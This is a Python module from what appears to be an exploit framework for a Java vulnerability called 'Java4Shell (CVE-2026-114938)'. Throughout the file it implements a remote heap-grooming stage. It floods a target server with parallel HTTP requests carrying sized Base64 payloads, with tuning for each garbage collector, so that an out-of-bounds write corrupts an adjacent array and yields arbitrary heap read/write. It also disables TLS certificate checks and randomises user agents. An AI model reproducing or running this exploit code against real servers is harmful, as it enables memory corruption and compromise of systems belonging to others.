# language: Python 3.10+, file: modules/grooming.py
# Heap grooming/spray for Java4Shell (CVE-2026-114938).
#
# Goal: position a controlled byte[] immediately adjacent to the buffer
# that the OOB write will overflow. When the OOB write fires, it corrupts
# the `length` field of our adjacent array, giving us an over-length array
# we can use for arbitrary heap R/W.
#
# Strategy per GC:
#   G1GC:        Fill current young-gen Eden region with same-sized objects,
#                forcing the JVM to open a new region. Our target array then
#                lands at the start of that new region, adjacent to our last spray.
#   ZGC:         ZGC uses 2MB "small pages". Spray to fill a page, then target
#                lands at page boundary which ZGC places adjacently.
#   Shenandoah:  Similar to G1GC but smaller regions (256KB typical).
#   ParallelGC:  Eden spray similar to G1GC.
#
# Note: JVM GC is non-deterministic. Grooming improves hit probability but
# does not guarantee exact placement on every attempt. Exploit retries
# (default 5) account for this.

import base64
import threading
import time
import urllib.request
import urllib.error
import ssl
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Optional

from modules.fingerprint import FingerprintResult
from modules.heap_oracle import HeapOracleResult
from modules.http_utils import random_ua, jitter


@dataclass
class GroomResult:
    success: bool = False
    rounds_completed: int = 0
    total_requests: int = 0
    elapsed_ms: float = 0.0
    errors: int = 0
    notes: list[str] = field(default_factory=list)


def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _build_groom_request(url: str, endpoint: dict, spray_size: int,
                          extra_headers: dict) -> urllib.request.Request:
    """
    Build a grooming HTTP request. The request body carries a JSON blob
    containing a Base64-encoded string of exactly `spray_size` bytes,
    causing the JVM to allocate a byte[] of that size during decode.

    We use valid Base64 (no malformed padding) so the intrinsic runs
    cleanly and the allocation is predictable.
    """
    raw = b"G" * spray_size
    b64_payload = base64.b64encode(raw).decode()

    method = endpoint.get("method", "POST")
    path   = endpoint.get("path", "/")
    ct     = endpoint.get("extra_headers", {}).get("Content-Type", "application/json")
    tmpl   = endpoint.get("body_template")

    if tmpl:
        body_str = tmpl.replace("{PAYLOAD}", b64_payload)
        body = body_str.encode()
    else:
        body = f'{{"data":"{b64_payload}","spray":true}}'.encode()

    headers = {
        "User-Agent": random_ua(),
        "Content-Type": ct,
        **extra_headers,
    }
    if method == "GET":
        body = None

    req = urllib.request.Request(
        url.rstrip("/") + path,
        data=body,
        headers=headers,
        method=method,
    )
    return req


def _send_groom(req: urllib.request.Request, timeout: float) -> bool:
    """Send one grooming request. Returns True if no fatal error."""
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()):
            return True
    except urllib.error.HTTPError:
        return True   # HTTP error is fine — allocation still happened
    except Exception:
        return False


def _groom_round(target_url: str, endpoint: dict, spray_size: int,
                 spray_count: int, threads: int, timeout: float) -> tuple[int, int]:
    """
    Send `spray_count` grooming requests in parallel.
    Returns (successes, errors).
    """
    successes = 0
    errors = 0
    lock = threading.Lock()

    reqs = [
        _build_groom_request(target_url, endpoint, spray_size, {})
        for _ in range(spray_count)
    ]

    with ThreadPoolExecutor(max_workers=threads) as pool:
        futures = [pool.submit(_send_groom, req, timeout) for req in reqs]
        for f in as_completed(futures):
            ok = f.result()
            with lock:
                if ok:
                    successes += 1
                else:
                    errors += 1

    return successes, errors


# ─── GC-specific strategies ───────────────────────────────────────────────────

def _strategy_g1gc(fp: FingerprintResult, oracle: HeapOracleResult) -> dict:
    """
    G1GC grooming strategy.
    Fill Eden with uniform-sized byte[] until a GC cycle fires (observed via timing).
    After GC, the survivor objects are compacted — next allocation lands predictably.
    Two rounds: heavy spray (fill Eden), then light spray (position adjacent array).
    """
    region_size = fp.region_size_bytes or (1024 * 1024)
    # Round 1: fill most of a region with our spray objects
    round1_size  = oracle.groom_spray_size
    round1_count = max(100, region_size // max(round1_size, 1))
    # Round 2: smaller objects to precisely position the target array
    round2_size  = 128
    round2_count = 50

    return {
        "rounds": [
            {"spray_size": round1_size, "spray_count": round1_count, "label": "Eden fill"},
            {"spray_size": round2_size, "spray_count": round2_count, "label": "Fine positioning"},
        ]
    }


def _strategy_zgc(fp: FingerprintResult, oracle: HeapOracleResult) -> dict:
    """
    ZGC grooming strategy.
    ZGC 2MB small pages — spray to fill one page completely, then trigger
    a new page open. ZGC allocates pages contiguously within a generation.
    """
    page_size = 2 * 1024 * 1024    # 2MB
    obj_size  = oracle.groom_spray_size or (1024 * 64)
    count     = max(50, page_size // max(obj_size, 1))

    return {
        "rounds": [
            {"spray_size": obj_size, "spray_count": count, "label": "ZGC page fill"},
            {"spray_size": 256,      "spray_count": 100,  "label": "Fine positioning"},
        ]
    }


def _strategy_shenandoah(fp: FingerprintResult, oracle: HeapOracleResult) -> dict:
    """
    Shenandoah grooming strategy.
    Shenandoah uses 256KB–32MB regions. Default is 256KB for small heaps.
    Similar to G1GC but smaller region fill target.
    """
    region_size = fp.region_size_bytes or (256 * 1024)
    obj_size    = min(oracle.groom_spray_size, region_size // 4)
    count       = max(80, region_size // max(obj_size, 1))

    return {
        "rounds": [
            {"spray_size": obj_size, "spray_count": count, "label": "Shenandoah region fill"},
            {"spray_size": 128,      "spray_count": 80,   "label": "Fine positioning"},
        ]
    }


def _get_strategy(fp: FingerprintResult, oracle: HeapOracleResult) -> dict:
    gc = (fp.gc_type or "G1GC").upper()
    if "ZGC" in gc:
        return _strategy_zgc(fp, oracle)
    if "SHENANDOAH" in gc:
        return _strategy_shenandoah(fp, oracle)
    return _strategy_g1gc(fp, oracle)   # G1GC and ParallelGC


# ─── Main grooming function ────────────────────────────────────────────────────

def run_grooming(fp: FingerprintResult, oracle: HeapOracleResult,
                 threads: int = 20, timeout: float = 10.0,
                 verbose: bool = False) -> GroomResult:
    """
    Execute the heap grooming phase.
    Returns a GroomResult. Caller should then immediately fire the OOB trigger.
    """
    groom = GroomResult()

    if not fp.reachable or not fp.profile:
        groom.notes.append("Target not ready — grooming skipped.")
        return groom

    # Pick highest-priority endpoint
    endpoints = sorted(fp.profile.endpoints, key=lambda e: e["priority"])
    endpoint  = endpoints[0]

    strategy = _get_strategy(fp, oracle)
    rounds   = strategy["rounds"]

    t_start = time.perf_counter()
    total_requests = 0
    total_errors   = 0

    for i, rnd in enumerate(rounds):
        spray_size  = rnd["spray_size"]
        spray_count = rnd["spray_count"]
        label       = rnd.get("label", f"Round {i+1}")

        if verbose:
            print(f"  [groom] {label}: {spray_count} × {spray_size}B objects …")

        ok, err = _groom_round(
            fp.target_url, endpoint, spray_size,
            spray_count, threads, timeout,
        )
        total_requests += spray_count
        total_errors   += err
        groom.rounds_completed += 1

        if verbose:
            print(f"  [groom]   → {ok} OK, {err} errors")

        # Brief pause between rounds to let GC settle
        time.sleep(0.1)

    groom.elapsed_ms     = (time.perf_counter() - t_start) * 1000
    groom.total_requests = total_requests
    groom.errors         = total_errors
    groom.success        = (total_errors / max(total_requests, 1)) < 0.3

    groom.notes.append(
        f"Grooming complete: {groom.rounds_completed} rounds, "
        f"{total_requests} requests, {total_errors} errors, "
        f"{groom.elapsed_ms:.0f}ms"
    )
    groom.notes.append(
        f"GC strategy: {fp.gc_type or 'G1GC'} — "
        f"spray sizes: {[r['spray_size'] for r in rounds]}"
    )

    return groom
